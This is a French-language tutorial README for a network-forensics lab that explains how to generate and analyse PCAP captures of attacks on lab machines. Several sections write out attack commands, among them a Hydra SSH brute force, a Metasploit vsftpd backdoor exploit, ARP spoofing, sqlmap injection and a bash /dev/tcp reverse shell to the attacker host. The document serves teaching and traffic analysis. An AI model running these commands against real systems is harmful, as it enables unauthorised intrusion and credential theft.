# 📊 Fichiers PCAP - Exemples de Captures Réseau

---

## 📖 Introduction

Ce dossier contient des descriptions d'exemples de fichiers PCAP (Packet Capture) que vous pouvez créer ou analyser dans votre lab de cybersécurité. Les fichiers PCAP sont essentiels pour comprendre le trafic réseau et identifier les activités malveillantes.

**Format** : PCAP (Packet Capture)
**Outils d'analyse** : Wireshark, tshark, tcpdump

---

## 📚 Exemples de Captures à Créer

### 1. `http_login.pcap` - Capture d'authentification HTTP

**Scénario** : Capture d'une authentification HTTP non chiffrée (credentials en clair)

**Comment créer cette capture** :
```bash
# Sur Kali (192.168.100.10)
tcpdump -i eth0 -w http_login.pcap host 192.168.100.20 and port 80

# Sur un autre terminal, se connecter au site
curl -u "admin:password" http://192.168.100.20/admin

# Arrêter la capture avec Ctrl+C
```

**Ce que vous trouverez** :
- Requêtes HTTP POST avec formulaire de login
- Credentials en clair dans les headers HTTP
- En-têtes `Authorization: Basic` (Base64)

**Analyse avec Wireshark** :
```
Filtre: http.request.method == "POST"
Chercher: http.authorization ou http.request.uri contains "login"
```

**Objectif pédagogique** : Comprendre pourquoi HTTPS est nécessaire

---

### 2. `ftp_anonymous.pcap` - Connexion FTP anonyme

**Scénario** : Capture d'une connexion FTP anonyme avec transfert de fichiers

**Comment créer cette capture** :
```bash
# Démarrer la capture
tcpdump -i eth0 -w ftp_anonymous.pcap port 21 or port 20

# Se connecter en FTP
ftp 192.168.100.20
# Username: anonymous
# Password: anonymous@example.com
# Commandes: ls, get file.txt
```

**Ce que vous trouverez** :
- Commandes FTP en clair (USER, PASS, LIST, RETR)
- Contenu des fichiers transférés (sur port 20)
- Mots de passe en clair

**Analyse avec Wireshark** :
```
Filtre: ftp or ftp-data
Chercher: ftp.request.command == "PASS"
```

---

### 3. `ssh_bruteforce.pcap` - Attaque brute-force SSH

**Scénario** : Capture d'une attaque brute-force SSH avec Hydra

**Comment créer cette capture** :
```bash
# Démarrer la capture sur Metasploitable
tcpdump -i eth0 -w ssh_bruteforce.pcap port 22

# Sur Kali, lancer l'attaque
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.20
```

**Ce que vous trouverez** :
- Multiples tentatives de connexion SSH
- Paquets SSH (encrypted, donc pas de passwords visibles)
- Pattern d'attaque : nombreuses connexions en peu de temps

**Analyse avec Wireshark** :
```
Filtre: ssh
Statistiques: Statistics > Conversations > TCP
```

**Objectif pédagogique** : Identifier les patterns d'attaque brute-force

---

### 4. `nmap_scan.pcap` - Scan Nmap complet

**Scénario** : Capture d'un scan Nmap (SYN scan, scan de version)

**Comment créer cette capture** :
```bash
# Sur Metasploitable, capturer
tcpdump -i eth0 -w nmap_scan.pcap host 192.168.100.10

# Sur Kali, lancer le scan
nmap -sS -sV -A 192.168.100.20
```

**Ce que vous trouverez** :
- Paquets SYN, SYN-ACK, RST (TCP handshake)
- Scan de ports séquentiel
- Tentatives de détection de version

**Analyse avec Wireshark** :
```
Filtre: tcp.flags.syn == 1 and tcp.flags.ack == 0
Statistiques: Statistics > Endpoints > TCP
```

---

### 5. `metasploit_exploit.pcap` - Exploitation Metasploit

**Scénario** : Capture d'une exploitation vsftpd backdoor avec Metasploit

**Comment créer cette capture** :
```bash
# Capturer sur les deux machines
tcpdump -i eth0 -w metasploit_exploit.pcap

# Lancer l'exploitation
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.100.20
exploit
```

**Ce que vous trouverez** :
- Connexion FTP initiale
- Trigger de la backdoor (username avec ":)" )
- Ouverture du port 6200
- Commandes shell exécutées

**Analyse avec Wireshark** :
```
Filtre: ftp or tcp.port == 6200
Suivre: Follow TCP Stream
```

---

### 6. `arp_spoofing.pcap` - Attaque ARP Spoofing

**Scénario** : Capture d'une attaque Man-in-the-Middle via ARP spoofing

**Comment créer cette capture** :
```bash
# Capturer le trafic ARP
tcpdump -i eth0 -w arp_spoofing.pcap arp

# Sur Kali, lancer l'attaque
arpspoof -i eth0 -t 192.168.100.20 192.168.100.1
```

**Ce que vous trouverez** :
- Requêtes ARP légitimes
- Requêtes ARP malveillantes (duplicate IP)
- Flux de trafic redirigé

**Analyse avec Wireshark** :
```
Filtre: arp
Chercher: Duplicate IP address detected
```

---

### 7. `sql_injection.pcap` - Attaque SQL Injection

**Scénario** : Capture d'une attaque SQLMap sur une application web

**Comment créer cette capture** :
```bash
# Capturer HTTP
tcpdump -i eth0 -w sql_injection.pcap port 80

# Lancer SQLMap
sqlmap -u "http://192.168.100.20/mutillidae/index.php?page=user-info.php&username=test" --dbs
```

**Ce que vous trouverez** :
- Requêtes HTTP avec payloads SQL
- Tests d'injection (UNION, OR 1=1, etc.)
- Réponses du serveur avec erreurs SQL

**Analyse avec Wireshark** :
```
Filtre: http
Chercher: http.request.uri contains "UNION" or "1=1"
```

---

### 8. `dns_enumeration.pcap` - Énumération DNS

**Scénario** : Capture d'une énumération DNS

**Comment créer cette capture** :
```bash
# Capturer DNS
tcpdump -i eth0 -w dns_enumeration.pcap port 53

# Énumération DNS
dnsenum domain.local
```

**Ce que vous trouverez** :
- Requêtes DNS (A, AAAA, MX, NS, TXT)
- Tentatives de transfert de zone
- Réponses DNS

---

### 9. `smb_enumeration.pcap` - Énumération SMB

**Scénario** : Capture d'énumération SMB avec enum4linux

**Comment créer cette capture** :
```bash
# Capturer SMB
tcpdump -i eth0 -w smb_enumeration.pcap port 139 or port 445

# Énumération
enum4linux -a 192.168.100.20
```

**Ce que vous trouverez** :
- Handshake SMB
- Requêtes d'énumération (users, shares, policies)
- Réponses SMB

---

### 10. `reverse_shell.pcap` - Reverse Shell

**Scénario** : Capture d'un reverse shell Netcat

**Comment créer cette capture** :
```bash
# Sur Kali, démarrer le listener
nc -lvnp 4444

# Capturer
tcpdump -i eth0 -w reverse_shell.pcap port 4444

# Sur la cible, établir le reverse shell
bash -i >& /dev/tcp/192.168.100.10/4444 0>&1
```

**Ce que vous trouverez** :
- Connexion TCP établie
- Commandes shell encodées
- Résultats des commandes

---

## 🔍 Analyse des PCAPs avec Wireshark

### Commandes Wireshark utiles

**Ouvrir un fichier PCAP** :
```bash
wireshark capture.pcap
```

**Filtres display courants** :
```
http                          # Tout le trafic HTTP
http.request                  # Requêtes HTTP uniquement
http.request.method == "POST" # POST requests
tcp.port == 80                # Trafic sur port 80
ip.addr == 192.168.100.20     # Trafic depuis/vers cette IP
tcp.flags.syn == 1            # Paquets SYN
ftp or ssh or telnet          # Protocoles en clair
```

**Follow Stream** :
```
Clic droit sur un paquet > Follow > TCP Stream
```

**Exporter des objets** :
```
File > Export Objects > HTTP/FTP/SMB
```

**Statistiques** :
```
Statistics > Protocol Hierarchy     # Hiérarchie des protocoles
Statistics > Conversations          # Conversations réseau
Statistics > Endpoints              # Points de terminaison
Statistics > IO Graphs              # Graphiques I/O
```

---

## 📊 Analyse avec tshark (ligne de commande)

### Commandes tshark utiles

**Lire un PCAP** :
```bash
tshark -r capture.pcap
```

**Filtrer par protocole** :
```bash
tshark -r capture.pcap -Y "http"
```

**Extraire des champs spécifiques** :
```bash
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.method -e http.request.uri
```

**Trouver les mots de passe HTTP** :
```bash
tshark -r http_login.pcap -Y "http.request.method == POST" -T fields -e http.file_data
```

**Statistiques** :
```bash
tshark -r capture.pcap -q -z io,phs              # Protocol hierarchy
tshark -r capture.pcap -q -z conv,tcp            # TCP conversations
tshark -r capture.pcap -q -z endpoints,tcp       # TCP endpoints
```

---

## 🎯 Exercices d'Analyse PCAP

### Exercice 1 : Détection de credentials
**Objectif** : Trouver les identifiants dans `http_login.pcap`

**Questions** :
1. Quel est le username utilisé ?
2. Quel est le password ?
3. Quel protocole d'authentification est utilisé ?
4. Comment sécuriser cette connexion ?

### Exercice 2 : Analyse de scan
**Objectif** : Analyser `nmap_scan.pcap`

**Questions** :
1. Combien de ports ont été scannés ?
2. Quels ports sont ouverts ?
3. Quel type de scan a été utilisé (SYN, Connect, UDP) ?
4. Quelle est la durée du scan ?

### Exercice 3 : Détection d'attaque
**Objectif** : Identifier l'attaque dans `ssh_bruteforce.pcap`

**Questions** :
1. Combien de tentatives de connexion ont été faites ?
2. Quelle est la fréquence des tentatives ?
3. Comment détecter ce type d'attaque ?
4. Quelles contre-mesures recommandez-vous ?

---

## 📚 Ressources supplémentaires

### PCAPs d'entraînement publics

1. **Wireshark Sample Captures**
   - URL: https://wiki.wireshark.org/SampleCaptures
   - Contenu: Centaines d'exemples de captures

2. **Malware Traffic Analysis**
   - URL: https://www.malware-traffic-analysis.net/
   - Contenu: PCAP de trafic malware réel

3. **PacketLife PCAP**
   - URL: http://packetlife.net/captures/
   - Contenu: Captures de protocoles réseau

4. **SANS DFIR**
   - URL: https://www.netresec.com/index.ashx?page=PcapFiles
   - Contenu: PCAPs pour forensics

---

## ✅ Checklist d'Analyse PCAP

Pour chaque PCAP analysé :

- [ ] Identifier les hôtes impliqués (IP source et destination)
- [ ] Identifier les protocoles utilisés
- [ ] Analyser la hiérarchie des protocoles
- [ ] Chercher des anomalies (scans, brute-force, etc.)
- [ ] Identifier les credentials en clair
- [ ] Extraire les fichiers transférés
- [ ] Documenter les findings
- [ ] Proposer des recommandations de sécurité

---

## 📝 Notes

**Stockage** : Les fichiers PCAP peuvent être volumineux. Compressez-les avec gzip :
```bash
gzip capture.pcap
# Lecture : zcat capture.pcap.gz | wireshark -k -i -
```

**Nettoyage** : Supprimez les données sensibles avant de partager :
```bash
tcprewrite --infile=capture.pcap --outfile=cleaned.pcap --enet-smac=00:00:00:00:00:01 --enet-dmac=00:00:00:00:00:02
```

**Fusion de PCAPs** :
```bash
mergecap -w merged.pcap capture1.pcap capture2.pcap capture3.pcap
```

---

**🎓 Bon apprentissage avec l'analyse de trafic réseau !**
